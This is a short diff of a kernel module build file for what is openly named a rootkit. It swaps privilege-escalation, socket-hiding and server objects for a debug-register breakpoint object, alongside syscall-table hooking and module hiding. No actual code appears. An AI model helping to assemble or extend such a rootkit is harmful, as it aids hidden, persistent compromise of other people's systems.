@@ -26,9 +26,7 @@ $(ROOTKIT)-y	+= src/core.o
 $(ROOTKIT)-y 	+= src/syscall_table.o
 $(ROOTKIT)-y	+= src/include/utils.o
 $(ROOTKIT)-y	+= src/module_hiding.o
-$(ROOTKIT)-y	+= src/sys_escalation.o
-$(ROOTKIT)-y	+= src/socket_hiding.o
-$(ROOTKIT)-y	+= src/server.o
+$(ROOTKIT)-y	+= src/dr_breakpoints.o
 $(ROOTKIT)-y	+= src/hook.o
 
 ccflags-y 	:= -I$(SRC_H) -I$(INCL_H) -g -DDEBUG
